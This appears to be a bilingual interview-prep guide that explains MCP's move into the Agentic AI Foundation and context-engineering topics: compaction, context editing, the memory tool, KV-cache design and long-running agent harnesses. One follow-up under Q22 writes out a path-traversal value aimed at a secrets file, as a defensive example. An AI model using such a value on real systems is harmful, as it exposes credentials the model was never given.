2. **什么没变**：MCP 博客写明治理模型不变，技术决策仍由原来的维护者（maintainers）通过规范增强提案（Specification Enhancement Proposal, SEP）流程做。AAIF 理事会管预算、成员和新项目审批，不定技术方向。
3. **已经看到的效果**：2026-07-28 版引入了正式的功能生命周期和弃用政策（至少 12 个月窗口、弃用登记表）、扩展框架（Tasks、MCP Apps 等放进可选扩展）、SDK 分级。这些是"厂商中立的长期标准"该有的东西，企业敢基于它做长期投入。A2A 也在 2026-08 加入 AAIF，协议层开始收拢到同一个基金会。
4. **我的判断**：
   - 核心会越来越**小而稳**，新能力走扩展。2026-07-28 已经弃用了 Sampling、Roots、Logging，方向很清楚。
   - 竞争点会从"协议本身"转到**企业落地**：授权（CIMD、企业托管授权）、网关、注册中心（registry）、可观测性（OpenTelemetry trace 透传已写进规范）。
   - 风险：多方治理会变慢；扩展太多会碎片化；安全问题（Q18）不会因为进了基金会就消失。
5. **对工程师的意义**：把 MCP 当成稳定的集成边界去设计；跟踪弃用登记表而不是二手博客；SDK 版本锁定并按弃用时间表升级。

**English answer (speakable, ~45–75 s):**
> The facts first. In December 2025, MCP was donated to the Agentic AI Foundation, a directed fund under the Linux Foundation, co-founded by Anthropic, Block and OpenAI, with goose and AGENTS.md as sister projects. The technical governance didn't change: the same maintainers decide through the SEP process, and the foundation board handles budget and membership. I think that's the right split. What I've already seen since then supports the neutral-standard story: a formal deprecation policy with at least a twelve-month window, an extensions framework so the core can stay small, and A2A joining the same foundation. My prediction is that the core protocol gets smaller and more stable, and the competition moves to enterprise concerns: auth, gateways, registries and observability. The risks are slower decisions and fragmentation across extensions. And security problems like tool poisoning don't go away because of a foundation. For me as an engineer, it means I can treat MCP as a stable integration boundary, as long as I pin SDK versions and track the deprecation registry.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| MCP 会被别的协议取代吗？ | 短期不会：已有大量 server 和多家厂商客户端支持，A2A 定位不同（agent 之间），Agent Skills 是给模型的程序性知识，不是集成协议。更可能是各层并存 | Unlikely soon. It has broad server and client adoption, A2A targets agent-to-agent, and Skills package procedural knowledge rather than integrations. The layers coexist. |
| 你会在生产里依赖扩展吗？ | 看扩展的成熟度和 SDK 支持：官方扩展（如 Tasks）可以用，但要做能力探测，对方不支持时有降级路径 | Official extensions like Tasks, yes, but behind capability detection with a fallback when the peer doesn't support them. |

**坑**
- 说"MCP 现在归 Linux Foundation 管技术方向"。基金会理事会不定技术方向，维护者仍然主导。
- 把 AAIF 成员数说成具体数字（有二手报道写"250+"）。没有找到一手来源，不要说。
- 引用 10,000+ server / 9,700 万下载时要说明是 2025-12 Anthropic 公告的数字，之后没有核实过的新数字。

**来源：** [Anthropic: Donating MCP and establishing the AAIF（2025-12-09）](https://www.anthropic.com/news/donating-the-model-context-protocol-and-establishing-of-the-agentic-ai-foundation)、[MCP blog: MCP joins the Agentic AI Foundation](https://blog.modelcontextprotocol.io/posts/2025-12-09-mcp-joins-agentic-ai-foundation/)、[MCP Feature lifecycle policy](https://modelcontextprotocol.io/community/feature-lifecycle)、[MCP 2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)、[A2A joins AAIF（A2A blog）](https://a2a-protocol.org/latest/blog/2026/08/27/a-new-chapter-for-a2a-joining-the-agentic-ai-foundation/)

---

## 模块 D：上下文工程 <a id="md"></a> [↑ 目录](#toc)

![上下文窗口的组成、缓存断点，以及上下文编辑、压缩、外部记忆、子 agent 四种腾空间办法](notes/images/06d-context-window.svg)

### Q20 · 上下文工程（context engineering）和提示词工程有什么区别？上下文工程具体要管哪些东西？ <a id="q20"></a> [↑ 目录](#toc)

**English question:** What is the difference between context engineering and prompt engineering, and what exactly does context engineering manage?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 · 长时运行的多 agent 流水线](06-ai-system-design.md#h21) 和 [具体怎么做](06-ai-system-design.md#h22) 讲了上下文（context）契约、压缩（compaction）快照（snapshot）、状态外化（state externalization），属于上下文工程（context engineering）的具体做法，但没有给出概念定义；[04 Agent 入门](notes/04-agent-basics.md) 讲了 agent 的三层记忆（memory）。本题补定义和框架。

**答案要点**
1. **定义（Anthropic 2025-09-29）**：
   - 提示词工程（prompt engineering）：怎么写、怎么组织给模型的指令。
   - 上下文工程（context engineering）：在推理（inference）时**挑选和维护最优的那一组 token**，包括 prompt 以外进入上下文的所有东西，例如工具定义（tool definition）、工具结果（tool result）、历史消息、检索（retrieval）到的文档、记忆。
   - 关系：提示词工程是上下文工程的一个子集。单轮问答主要靠写好 prompt；agent 多轮（multi-turn）循环（loop）时，每一轮都要重新决定"放什么进上下文"。
2. **为什么需要它**：上下文腐烂（context rot）：上下文越长，模型准确回忆其中信息的能力越差。Anthropic 把它比作"注意力预算（attention budget）"，每多一个 token 都在花预算。指导原则：**用最少的高信号 token，最大化得到想要结果的概率**。
3. **管哪些东西（我的清单）**：
   - 系统提示（system prompt）：高度要合适（right altitude），不写死脆弱的 if-else，也不能空泛。
   - 工具：数量少、职责不重叠、返回结果省 token（和 [06 §2.3](06-ai-system-design.md#s2-3) 的"结果有预算"一致）。
   - 示例：少而典型，不堆边界情况。
   - 按需加载（just-in-time context）：上下文里只放轻量引用（reference，文件路径、查询、链接），需要时用工具去取。
   - 长任务三板斧：压缩（compaction）、结构化笔记（structured note-taking，写在上下文窗口外面、需要时读回）、子 agent（sub-agent，各用干净的上下文，只把 1,000–2,000 token 的精炼总结交回主 agent）。
   - 成本维度：前缀（prefix）稳定，提高 KV-cache 命中（见 Q21）。
4. **在工程上的落点**：把"上下文"当成一个由**代码组装**的产物，而不是对话自然累积的结果。每个 agent 有上下文契约：能读哪些字段、token 上限是多少。

**English answer (speakable, ~45–75 s):**
> Prompt engineering is about how you write and organize the instructions. Context engineering is the broader job of deciding, at every step, which tokens the model sees at all: the system prompt, tool definitions, tool results, message history, retrieved documents and memory. For a single-turn task, a good prompt is most of the work. For an agent that loops fifty times, the hard part is what accumulates. Every tool result piles up, and models get worse at recalling things as the context grows. Anthropic calls that context rot. So the principle I follow is the smallest set of high-signal tokens that makes the right outcome likely. Concretely, that means a few non-overlapping tools with compact outputs, and lightweight references instead of whole documents, with the agent fetching details just in time. For long tasks I add compaction, notes kept outside the window, and sub-agents that return short summaries. In my own work I treat context as something code assembles per step, with a contract per agent, rather than something that just grows.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 按需加载（just-in-time）有什么代价？ | 多了工具调用往返，慢；模型可能不知道该去取什么。所以常用混合策略：稳定的关键信息预先放进上下文，细节按需取（Anthropic 说 Claude Code 就是混合式） | More round trips and latency, and the model has to know what to fetch. A hybrid works best: preload the stable essentials and fetch the details on demand. |
| 怎么衡量上下文工程做得好不好？ | 同一评测集上比较任务成功率、每任务 token、缓存命中率、上下文峰值长度；再看长任务后半段的错误率是否明显升高 | Same eval set: task success, tokens per task, cache hit rate and peak context length, plus whether error rates climb late in long runs. |

**坑**
- 把上下文工程说成"写更长更详细的 prompt"。方向正好相反，是做减法。
- 只谈系统提示，忘了工具结果。agent 场景里上下文增长的大头通常是工具结果。
- 把"上下文腐烂"说成某个精确阈值（比如"超过 X 万 token 就不行"）。一手资料只说随长度下降，并且和任务、模型有关。

**来源：** [Anthropic: Effective context engineering for AI agents（2025-09-29）](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)、[Claude Docs: Context windows](https://platform.claude.com/docs/en/build-with-claude/context-windows)

---

### Q21 · 为什么 Manus 说 KV-cache 命中率是生产 Agent 最重要的指标？怎么设计上下文才能提高命中率？ <a id="q21"></a> [↑ 目录](#toc)

**English question:** Why does Manus say KV-cache hit rate is the single most important metric for a production agent, and how do you design context to maximize it?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.8 · ② 提示缓存](06-ai-system-design.md#h39) 讲了原理（开头一字不差才命中）、排列顺序（稳定在前、变化在后）、时间戳（timestamp）坑和要监控（monitoring）命中率（hit rate）。本题补 Manus 的数据和 agent 专属做法。

**答案要点**
1. **KV 缓存（KV-cache）**：模型处理 prompt 时，每个 token 都会算出注意力用的 Key/Value 向量（vector）。前缀和上次**完全相同**的部分可以直接复用这些向量，不用重算。厂商（vendor）把这个能力做成提示缓存（prompt caching），命中的部分更便宜、首 token 更快。
2. **为什么在 agent 里最重要（Manus 2025-07-18 原文数据）**：
   - agent 每一步都要重发"系统提示 + 工具 + 全部历史"，只追加一小段新内容。Manus 的平均输入:输出 token 比约 **100:1**，所以成本几乎全在输入上。
   - 以 Claude Sonnet 为例，缓存命中的输入 0.30 美元/百万 token，未命中 3 美元/百万 token，**差 10 倍**。
   - 估算（estimation，推算）：一个 100k token 的前缀，未命中每步 100,000 × 3 / 1,000,000 = 0.30 美元，命中每步 0.03 美元；50 步的任务差约 13.5 美元。
3. **怎么设计（Manus 的做法）**：
   - **前缀稳定**：系统提示开头不放精确到秒的时间戳。
   - **只追加（append-only）**：不回头改之前的动作和观察。
   - **序列化确定**：JSON key 顺序要固定，有些库不保证顺序，会悄悄破坏缓存。
   - **显式缓存断点**：需要手动标断点的厂商，至少在系统提示末尾标一个。
   - **工具"遮蔽而不删除"（mask, don't remove）**：任务中途动态增删工具会让后面的缓存全部失效，而且历史里引用了已删除的工具，模型会困惑。Manus 用状态机（state machine）在解码（decoding）时屏蔽 token logits，限制当前能选的动作；工具名用统一前缀（`browser_`、`shell_`）方便按组屏蔽。
4. **Anthropic 侧的对应规则**：缓存按 `tools → system → messages` 的层级建立，**改工具定义会让整个缓存失效**；最多 4 个断点；默认 TTL 5 分钟。MCP 2026-07-28 也建议 `tools/list` 返回顺序固定，理由之一就是提示缓存命中率。

**English answer (speakable, ~45–75 s):**
> Because agents are input-heavy. Every step resends the system prompt, the tools and the whole history, and only appends a little. Manus reported an input-to-output ratio of about a hundred to one. On the Claude Sonnet pricing they quoted, cached input was thirty cents per million tokens versus three dollars uncached, a tenfold difference. And cache hits also cut time to first token. So hit rate drives both cost and latency more than almost anything else. To keep it high, I treat the prompt prefix as immutable. No timestamps at the top. History is append-only, never rewritten. Serialization is deterministic, so JSON keys always come out in the same order. Cache breakpoints sit at the end of the system prompt. And I don't add or remove tools mid-task, because changing tool definitions invalidates everything after them. If I need to restrict actions, I mask them at decoding time or in the orchestrator instead. Then I put cache hit rate on the dashboard next to cost per task.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 压缩（compaction）和缓存冲突吗？ | 冲突：压缩会改写历史，压缩点之后的缓存失效。缓解：在系统提示末尾放断点，压缩后系统提示部分仍然命中，只需要为新的摘要写一次缓存（Anthropic 文档的做法）；压缩不要太频繁 | Yes, compaction rewrites history, so the cache after that point is gone. Put a breakpoint at the end of the system prompt so that part still hits, and only the new summary gets written. And don't compact too often. |
| 工具结果清理（context editing）也会破坏缓存吗？ | 会。Anthropic 文档写明清理工具结果会让缓存前缀失效，所以用 `clear_at_least` 保证每次清得足够多，才值得付重新写缓存的钱 | Yes. Clearing invalidates the cached prefix, which is why `clear_at_least` exists: only clear when you remove enough to pay for the cache rewrite. |

**坑**
- 把"10 倍"当成永远成立的常数。它来自 Manus 引用的 Claude Sonnet 当时的价格。Anthropic 当前文档：缓存读取一般是基础输入价的 0.1 倍，但 Opus 5.5 / Sonnet 5.5 是 0.05 倍（20 倍差距）；而且**写缓存要加价**（5 分钟 TTL 是 1.25 倍，1 小时是 2 倍）。帖子"差出 10 倍成本"的量级没错，但具体倍数取决于模型和厂商。
- 在 prompt 开头放用户 ID、随机排序的 few-shot 示例。
- 以为缓存能省上下文窗口（context window）。缓存只改变价格，缓存的 token 仍然占窗口。

**来源：** [Manus: Context Engineering for AI Agents: Lessons from Building Manus（2025-07-18）](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus)、[Claude Docs: Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)、[Claude Docs: Context editing](https://platform.claude.com/docs/en/build-with-claude/context-editing)、[MCP 2026-07-28 changelog（deterministic tools/list order）](https://modelcontextprotocol.io/specification/2026-07-28/changelog)

---

### Q22 · 长任务上下文快撑爆了，compaction、context editing、memory tool、子 agent 分别适合什么场景？怎么组合？ <a id="q22"></a> [↑ 目录](#toc)

**English question:** A long-running task is about to blow past its context window. When would you use compaction, context editing, a memory tool, or sub-agents, and how would you combine them?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 · 具体怎么做](06-ai-system-design.md#h22) 的第④部分讲了自己实现的压缩快照：约 70% 时触发、固定 schema、关键字段由代码原样复制、diff 检查。本题补 Anthropic 官方的四种机制和选择方法。

**答案要点**
1. **压缩（compaction）**：快到上限时，把较早的对话**总结**成一段摘要（summary），替换原文。Anthropic API 现在有两种服务端（server-side）压缩：
   - 按阈值自动触发：beta 头 `compact-2026-01-12`，edit 类型 `compact_20260112`，默认触发 150,000 输入 token，最低 50,000。响应开头返回一个 `compaction` 块，之后请求带上它，它之前的内容会被忽略。
   - 按需触发（on demand）：beta 头 `compact-2026-09-04`，由你决定何时压缩，可以保留最近几轮原文，也可以在后台跑。官方推荐优先用按需压缩。
   - 适合：通用的长对话、长 agent 循环。代价：有损，摘要可能丢细节。
2. **上下文编辑（context editing）**：按规则**删除**特定内容，不做总结。beta 头 `context-management-2025-06-27`：
   - `clear_tool_uses_20250919`：清旧的工具结果，默认 100,000 输入 token 触发，保留最近 3 次工具调用，可用 `exclude_tools` 保护某些工具的结果。被清掉的位置会留一段占位文字。
   - `clear_thinking_20251015`：清旧的思考块。
   - 适合：工具结果占大头、旧结果读过就没用的场景（搜索、读文件）。Anthropic 工程博客称清理旧工具结果是"最安全、最轻量"的压缩形式。
3. **记忆工具（memory tool）**：`memory_20250818`，**客户端（client）执行**。Claude 在 `/memories` 目录里创建、查看、修改文件，你的代码负责真正存储。启用后 API 会自动在系统提示里加一句"先查看记忆目录"。适合：跨会话（session）保存进度、经验、决定；需要"压缩之后也必须留下"的信息。和上下文编辑配合时，快到清理阈值会提醒 Claude 先把重要内容存进记忆。
4. **子 agent（sub-agent）**：把一个需要大量阅读的子任务（subtask）交给独立上下文的 agent，它只交回 1,000–2,000 token 的精炼结果。适合：广度优先的调研、能并行（parallel）的子任务。代价：token 总量变多，协调更复杂。
5. **组合（我的默认）**：上下文编辑清工具结果（最便宜、最不伤信息）→ 关键状态写记忆/外部 artifact（压缩后不会丢）→ 服务端压缩兜底（保证不会超窗口）→ 大块阅读型子任务交给子 agent。官方建议长任务把压缩和记忆一起用：压缩让活跃上下文保持小，记忆保存必须挺过总结的信息。

**English answer (speakable, ~45–75 s):**
> They solve different problems, so I layer them. Context editing is the cheapest and least lossy. It just clears old tool results or old thinking blocks by rule, keeps the last few, and leaves a placeholder. That's great when the bulk of the context is search results or file reads I've already used. Compaction summarizes older turns and replaces them. It works for anything, but it's lossy, so I use it as the safety net that guarantees I never overflow. A memory tool is different: it's a file store outside the window that the agent writes to and reads back. That's where I put things that must survive summarization: the goal, the constraints, the decisions and the progress. Sub-agents are for when one subtask needs to read a lot. It gets its own clean context and hands back a short summary. So my default stack is: clear stale tool results first, externalize key state into memory, let compaction catch the rest, and push heavy reading into sub-agents.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 压缩摘要丢了关键约束怎么办？ | 约束不靠摘要保存：放在系统提示或固定的状态块里，由代码每轮原样注入；也可以用自定义压缩指令（`instructions` 会完全替换默认提示）强调必须保留的字段；压缩后做 diff 检查 | Constraints shouldn't depend on the summary. Code re-injects them verbatim every turn, I can pass custom compaction instructions that list must-keep fields, and I diff before and after. |
| 记忆工具有什么安全问题？ | 路径穿越（`/memories/../../secrets.env`），必须规范化路径并限制在目录内；敏感信息过滤；文件大小上限和过期清理；记忆也可能被注入污染，读回时当数据不当指令 | Path traversal, so I canonicalize and confine every path. Plus filtering sensitive data, size caps and expiry. Memory can also be poisoned, so whatever I read back is data, not instructions. |

**坑**
- 混淆"清理"和"总结"：context editing 是删，compaction 是总结替换，二者损失的信息不同。
- 以为记忆工具由 Anthropic 存储。它是客户端工具，存储和数据保留（data retention）都由你负责。
- Anthropic 文档内部不一致：上下文编辑页提到压缩阈值默认 100,000，而阈值压缩页写的默认值是 150,000、最低 50,000。本文以阈值压缩页为准，用之前请再核对。

**来源：** [Claude Docs: Compaction overview](https://platform.claude.com/docs/en/build-with-claude/compaction)、[Claude Docs: Compaction at a token threshold](https://platform.claude.com/docs/en/build-with-claude/compaction-threshold)、[Claude Docs: Context editing](https://platform.claude.com/docs/en/build-with-claude/context-editing)、[Claude Docs: Memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)、[Anthropic: Effective context engineering for AI agents](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)

---

### Q23 · 一个要连续跑好几个小时的 coding agent，你会反复压缩上下文，还是定期重置上下文、靠外部状态接力？为什么？ <a id="q23"></a> [↑ 目录](#toc)

**English question:** For a coding agent that runs for several hours, would you keep compacting the context or periodically reset it and hand off through external state? Why?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 · 长时运行的多 agent 流水线](06-ai-system-design.md#h21) 讲了跑久变笨的原因（状态在对话里、上下文无限增长、状态漂移）和"状态外化"；[具体怎么做](06-ai-system-design.md#h22) 给了工作快照 schema。本题补 Anthropic 两篇长任务 harness 文章的结论。

**答案要点**
1. **两种做法**：
   - 压缩（compaction）：同一个 agent 原地总结历史继续跑。保留连续性，但没有"干净的开始"。
   - 上下文重置（context reset）：清空上下文，启动一个新 agent，靠结构化的交接产物（handoff artifact）接力。干净，但交接产物必须写够状态，还会增加编排（orchestration）复杂度、token 开销和延迟（latency）。
2. **Anthropic 的经验（2026-03-24，Prithvi Rajasekaran）**：有些模型快到它以为的上下文上限时会提前收尾，文章叫"上下文焦虑（context anxiety）"。Claude Sonnet 4.5 这种倾向强到只靠压缩不够，重置成了必需；到 Opus 4.5，这个行为基本消失，作者去掉重置，改成一个连续会话加自动压缩。
3. **更早一篇（2025-11-26）的结论**：只靠压缩不够。两个典型失败：一次想做完所有东西，做到一半上下文用光，留下半成品；后面的会话看到已有进度，就宣布项目完成。解决办法：
   - 初始化 agent（initializer agent）第一次运行时建 `init.sh`、`claude-progress.txt`、首个 git 提交，以及一份 JSON 功能清单（例子里有 200 多项，初始全部标为未通过）。
   - 之后每个编码会话只做一个功能，结束前 git commit 并更新进度文件；只允许改 `passes` 字段，文章原话的意思是"删除或修改测试是不可接受的"。
   - 每次开工先跑固定流程：`pwd` → 读 git log 和进度文件 → 选最高优先级的未完成功能 → 跑 `init.sh` → 先跑一次端到端（end-to-end）测试，发现上个会话留下的 bug。
   - 用浏览器自动化做端到端验证，不能只跑单元测试（unit test）或 curl 就标完成。
4. **我的选择**：**状态外化是必须的，压缩还是重置取决于模型和评测（evaluation, eval）。**不管用哪个，进度、功能清单、决策都写进 git 和结构化文件，这样两种模式可以随时切换。新模型先试"连续会话 + 压缩"；如果在评测里看到后半段提前收尾或质量下滑，就改成按功能边界重置。
5. **为什么用 JSON 而不是 Markdown 存清单**：文章说模型不太会乱改 JSON；我还会加代码校验（validation）：完成数只能增加，`passes` 只能由测试结果改。

**English answer (speakable, ~45–75 s):**
> Either way, I externalize the state, and then I choose between compaction and resets based on the model and the evals. Anthropic's long-running harness work is the clearest evidence. Compaction alone wasn't enough. Agents either tried to build everything at once and ran out of context halfway, or a later session saw progress and declared victory. What fixed it was an initializer that writes a feature list in JSON, all marked failing, plus a progress file, an init script and a first commit. Then every session does one feature, verifies it end to end, commits, and updates the progress file. On compaction versus reset: with Sonnet 4.5 they saw what they called context anxiety, where the model wraps up early as it nears the limit, so resets with a structured handoff were essential. With Opus 4.5 that mostly went away, and one continuous session with compaction worked. So I make the state in git and files good enough that a fresh agent can resume. Then resetting is cheap, and I can switch modes when the eval tells me to.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 交接产物里放什么？ | 目标、约束、功能清单状态、已做决定和原因、未解决问题、下一步、关键文件路径和最近一次通过的提交 hash；关键事实由代码复制，不让模型每次重写 | Goal, constraints, feature status, decisions with reasons, open questions, next step, key file paths and the last green commit. Facts are copied by code, not re-summarized by the model. |
| 怎么防止 agent "宣布完成"？ | 完成的定义由代码判断：功能清单全部通过 + 端到端测试通过 + CI 绿；agent 只能提议完成，不能自己宣布 | Done is decided by code: every feature passes, end-to-end tests pass and CI is green. The agent can propose completion but can't declare it. |

**坑**
- 二手文章说"Opus 4.6 才去掉重置"。原文写的是 **Opus 4.5** 基本消除了上下文焦虑；Opus 4.6 是作者后来去掉 sprint 结构时用的模型。
- 只说"压缩"而不提外部状态（external state）。压缩是有损的，几小时的任务一定要有 git + 进度文件这种可恢复的状态。
- 把单元测试通过当作功能完成。文章明确指出模型常在没做端到端验证时就标完成。

**来源：** [Anthropic: Effective harnesses for long-running agents（2025-11-26）](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)、[Anthropic: Harness design for long-running application development（2026-03-24）](https://www.anthropic.com/engineering/harness-design-long-running-apps)、[Claude Docs: Memory tool（multisession pattern）](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)

---

### Q24 · 用户反馈 Agent 聊到第 20 轮之后开始忘掉最初的约束、答非所问，你怎么排查和修复？ <a id="q24"></a> [↑ 目录](#toc)

**English question:** Users report that after about 20 turns the agent starts forgetting the original constraints and drifting off-topic. How do you investigate and fix it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 · 长时运行的多 agent 流水线](06-ai-system-design.md#h21) 的"状态漂移""Context 爆炸"两行和 [具体怎么做](06-ai-system-design.md#h22) 的压缩快照（约束由代码复制、diff 检查）是修复手段；[06 §2.10](06-ai-system-design.md#s2-10) 讲 trace。本题按实战流程串起来。

**答案要点**（先止血（mitigation） → 定位 → 根因（root cause） → 修复 → 上线指标）
1. **先止血**：
   - 把用户最初的硬约束（"只用中文""预算不超过 X""不能改生产数据"）提取成结构化字段，**每轮由代码重新注入**到靠近末尾的位置。这是最快见效的改动。
   - 临时降低会话长度上限：超过 N 轮提示用户开新会话，或自动压缩一次。
   - 有写操作（write operation）的场景，对违反约束的动作加代码层校验，直接拦截。
2. **定位**：
   - 用 trace 回放（replay）出问题的会话，看第 20 轮时模型实际收到的上下文：总 token 数、约束原文**还在不在**、在第几个位置、前面堆了多少工具结果。
   - 分桶统计：按轮次、上下文长度、是否发生过压缩/截断（truncation），看违规率从哪里开始上升。
   - 区分三种情况：约束被截断或总结丢了（上下文管理 bug）；约束还在但被淹没（注意力问题）；后续用户消息和约束冲突（conflict，需求问题）。
3. **根因（常见三类，都有一手证据）**：
   - **被删或被改写**：滑动窗口截掉了最早的消息；或者多次总结把约束越改越松（状态漂移）。
   - **长上下文（long context）里被忽视**：Chroma 测了 18 个模型，输入越长性能越差，简单任务也一样；"Lost in the Middle"发现信息在开头或结尾时效果最好，在中间时明显变差。
   - **多轮本身更难**：Laban 等（2025）在 20 万次以上的模拟对话中发现，多轮比单轮平均下降 39%，主要原因是不可靠性上升，模型早期做了假设，走错后"迷路"回不来。
4. **修复**：
   - 约束和状态外化：一个固定 schema 的"会话状态块"（目标、约束、已确认事实、已做决定），由代码维护、每轮注入，不交给 LLM 自由总结。
   - 压缩只总结"过程"，不碰约束字段；压缩前后做 diff，约束一条都不能少。
   - 背诵（recitation）：Manus 的做法是让 agent 持续重写一份 todo 清单，把目标"背"到上下文末尾，对抗约 50 次工具调用后的漂移。
   - 清理旧工具结果（context editing），降低噪声。
   - 用户中途改需求时，显式更新状态块（版本号 + 来源），不靠模型从历史里推断。
5. **上线指标**：
   - 离线：构造 30 轮以上的长对话评测集（eval set），约束放在第 1 轮，在第 10/20/30 轮检查遵守率；按轮次画曲线。
   - 线上：约束违规率（代码可判定的部分）、用户"我之前说过"类重复纠正的比例、每轮上下文 token 的分布、压缩触发次数。灰度（canary rollout）上线，和旧版本对比。

**English answer (speakable, ~45–75 s):**
> First I'd stop the bleeding: extract the user's hard constraints into a structured block that code re-injects every turn near the end of the context, and enforce the checkable ones in code. Then I'd pull traces for failing sessions and look at what the model actually received at turn twenty. Is the constraint still there? Where is it? How much tool output is piled in front of it? Usually it's one of three causes. Either the constraint was truncated or summarized away. Or it's still there but buried, and research like Chroma's context-rot report and "Lost in the Middle" shows models use long, cluttered contexts worse, especially the middle. Or the multi-turn setting itself: one study found a 39 percent average drop from single-turn to multi-turn, mostly from unreliability. The fix is to externalize the state: a schema'd session block maintained by code, compaction that never touches constraints, a diff check, and clearing stale tool results. I'd ship it behind an eval of thirty-turn conversations that measures constraint adherence at turns ten, twenty and thirty, then watch the violation rate and repeated user corrections in production.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 约束放系统提示开头还不够吗？ | 系统提示开头是有利位置，但隔着几十轮历史仍会被稀释；把精简版约束在末尾再"背"一次更稳，而且放在末尾的动态块不影响前缀缓存 | The top is a good position, but tens of turns dilute it. Restating a compact version near the end is more robust, and a block at the tail doesn't break the prefix cache. |
| 怎么区分"模型忘了"和"用户后来改了需求"？ | 状态块里的约束带来源轮次和版本；用户改约束时由代码确认并更新版本，评测和日志都能看到"当时生效的是哪一版" | Constraints carry their source turn and a version. When the user changes one, code confirms it and bumps the version, so logs show which constraint was in force. |

**坑**
- 直接换更大上下文的模型。窗口变大不解决注意力被稀释，Chroma 的结果正是窗口内的退化。
- 让 LLM 每轮"总结一下目前的约束"。多次改写会越来越松，正是状态漂移的来源。
- 只看平均成功率（success rate）。问题集中在长会话的尾部，要按轮次分桶看。

**来源：** [Chroma: Context Rot（2025-07-14）](https://www.trychroma.com/research/context-rot)、[Liu et al.: Lost in the Middle（TACL）](https://arxiv.org/abs/2307.03172)、[Laban et al.: LLMs Get Lost In Multi-Turn Conversation（2025）](https://arxiv.org/abs/2505.06120)、[Manus: Context Engineering for AI Agents](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus)、[Claude Docs: Context editing](https://platform.claude.com/docs/en/build-with-claude/context-editing)

---

### Q25 · 现在主流模型都有百万级上下文了，你怎么看"上下文工程已经不重要了"这种说法？ <a id="q25"></a> [↑ 目录](#toc)

**English question:** Mainstream models now have million-token context windows. What do you think of the claim that context engineering no longer matters?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.2 · 长上下文 vs RAG](06-ai-system-design.md#h14) 讲了长上下文和检索的取舍；[06 §2.8 · ② 提示缓存](06-ai-system-design.md#h39) 讲成本。本题从上下文工程角度给观点。

**答案要点**
1. **事实**：Anthropic 当前文档里，Opus 4.6 及以后的 Opus、Sonnet 4.6 及以后的 Sonnet、Haiku 5.5 等都是 1M token 上下文，默认开启，不需要 beta 头，按标准价格计费（Haiku 5.5 超过 10 万 token 加价）。
2. **我的观点：窗口变大，上下文工程从"装不下"的问题，变成"装什么最好"的问题，更重要了。** 理由：
   - **质量**：Anthropic 文档原话的意思是"更多上下文不一定更好"，token 变多准确率和召回（recall）会下降（context rot）。Chroma 测了 18 个模型，LongMemEval 上只给相关部分（约 300 token）明显好于给完整历史（约 113k token）。
   - **成本**：agent 每步都重发整个上下文。上下文是 Manus 说的 100:1 输入主导结构，窗口越大，每一步越贵；缓存能降价，但缓存的 token 仍然占窗口，前缀一变就要重写。
   - **延迟**：长输入的首 token 时间更长（未缓存时尤其明显）。
   - **agent 是无界的**：几小时的任务、几百次工具调用，任何固定窗口最终都会满，压缩、记忆、外部状态仍然需要。
   - **安全和权限（permission）**：放进上下文的东西模型都能看到、都可能被注入利用，最小化上下文也是安全原则。
3. **大窗口真正改变的**：
   - 中小规模语料（corpus，一个代码库、几百页合同）可以直接整体放进去，少做切块（chunking）检索。
   - 压缩可以晚一点触发，按需加载的粒度可以粗一点。
   - 子 agent 的必要性下降一些，但并行和隔离（isolation）的价值还在。
4. **结论**：大窗口是"容量"，上下文工程管的是"信噪比、成本和可控性"。我会用评测来决定：同一任务比较"全量放入"和"检索 + 精选"的成功率、成本、延迟，而不是凭感觉。

**English answer (speakable, ~45–75 s):**
> I'd say a bigger window changes the question from "what fits" to "what's worth including", and that makes context engineering more important, not less. Three reasons. Quality: Anthropic's own docs say more context isn't automatically better, because accuracy and recall degrade as token count grows. Chroma tested eighteen models and found focused prompts of a few hundred tokens beat full prompts of over a hundred thousand on the same memory task. Cost and latency: an agent resends its context on every step, so a bloated context is paid for fifty times per task, and caching helps the price but not the window. And agents are unbounded: a multi-hour run with hundreds of tool calls fills any fixed window eventually. What large windows really change is that a mid-sized codebase or a long contract can just go in whole, and compaction can kick in later. So I treat window size as capacity and context engineering as signal-to-noise, and I decide with evals: full context versus curated context, compared on success rate, cost and latency.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 那 RAG 还需要吗？ | 需要，但边界变了：语料超过窗口、需要权限过滤、数据经常更新、需要可追溯引用时仍然要检索；小而稳定的语料可以直接整体放入并配合缓存 | Yes, when the corpus exceeds the window, needs per-user access filtering, changes often, or needs citations. Small stable corpora can go in whole with caching. |
| 什么时候你会选择"全部放进去"？ | 语料小于窗口的一部分、问题需要跨全文推理（比如找矛盾）、语料稳定能缓存、评测证明效果不差于检索 | When the corpus is well under the window, the task needs whole-document reasoning like finding contradictions, the content is stable enough to cache, and evals show it's at least as good as retrieval. |

**坑**
- 拿"大海捞针（needle in a haystack）满分"证明长上下文没问题。Chroma 指出这种测试主要测字面匹配，换成语义匹配、加干扰项后就会退化。
- 忽略成本：一次请求放 1M token 就算单价不变，agent 循环乘上步数也非常贵。
- 说"上下文腐烂从某个固定长度开始"。一手资料只说随长度增加而下降，和模型、任务都有关。

